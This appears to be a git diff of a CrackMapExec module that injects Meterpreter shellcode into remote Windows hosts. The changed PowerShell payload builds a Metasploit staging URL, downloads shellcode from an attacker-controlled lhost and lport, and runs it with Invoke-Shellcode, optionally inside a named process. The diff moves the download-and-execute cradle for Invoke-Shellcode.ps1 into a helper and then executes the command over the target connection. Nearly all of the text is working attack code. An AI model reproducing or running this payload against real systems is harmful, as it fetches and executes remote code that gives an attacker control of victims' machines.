@@ -1,4 +1,4 @@
-from cme.helpers.powershell import obfs_ps_script, create_ps_command
+from cme.helpers.powershell import *
 from sys import exit
 
 class CMEModule:
@@ -42,9 +42,7 @@ class CMEModule:
         #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
         #so now we have to manually generate a valid Meterpreter request URL and download + exec the staged shellcode
 
-        payload = """
-        IEX (New-Object Net.WebClient).DownloadString('{}://{}:{}/Invoke-Shellcode.ps1')
-        $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
+        payload = """$CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
         $SumTest = $False
         while ($SumTest -eq $False)
         {{
@@ -55,18 +53,16 @@ class CMEModule:
         $Request = "{}://{}:{}/$($RequestUri)"
         $WebClient = New-Object System.Net.WebClient
         [Byte[]]$bytes = $WebClient.DownloadData($Request)
-        Invoke-Shellcode -Force -Shellcode $bytes""".format(context.server,
-                                                     context.localip,
-                                                     context.server_port,
-                                                     'http' if self.met_payload == 'reverse_http' else 'https',
-                                                     self.lhost,
-                                                     self.lport)
+        Invoke-Shellcode -Force -Shellcode $bytes""".format('http' if self.met_payload == 'reverse_http' else 'https',
+                                                            self.lhost,
+                                                            self.lport)
 
         if self.procid:
             payload += " -ProcessID {}".format(self.procid)
 
-        payload = create_ps_command(payload, force_ps32=True)
-        connection.execute(payload)
+        launcher = gen_ps_iex_cradle(context, 'Invoke-Shellcode.ps1', payload, post_back=False)
+        ps_command = create_ps_command(launcher, force_ps32=True)
+        connection.execute(ps_command)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
